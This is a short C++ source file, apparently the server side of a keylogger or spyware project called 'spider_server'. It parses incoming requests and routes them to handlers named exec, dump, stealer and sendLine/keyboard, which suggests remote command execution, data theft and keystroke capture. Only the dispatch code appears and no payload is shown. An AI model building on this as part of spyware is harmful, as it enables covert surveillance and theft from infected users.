//
//  main.hpp
//  spider_server
//
//  Created by Victor Sousa on 28/09/2017.
//
//

#include "IContent.hpp"

#include "Undefined.hpp"
#include "Status.hpp"
#include "Exec.hpp"
#include "Dump.hpp"
#include "Mouse.hpp"
#include "Stealer.hpp"
#include "Keyboard.hpp"

direct::IContent *direct::IContent::IContentCreator(const std::string& request) {
  std::string event = request.substr(0, request.find(' '));
  std::string content = std::string(request).erase(0, event.size() + 1);
  if (event == "status") {
    return new direct::Status(content);
  }
  if (event == "exec") {
    return new direct::Exec(content);
  }
  if (event == "dump") {
    return new direct::Dump(content);
  }
  if (event == "mouseInfo") {
    return new direct::Mouse(content);
  }
  if (event == "stealer") {
    return new direct::Stealer(content);
  }
  if (event == "sendLine") {
    return new direct::Keyboard(content);
  }
  return new direct::Undefined();
}
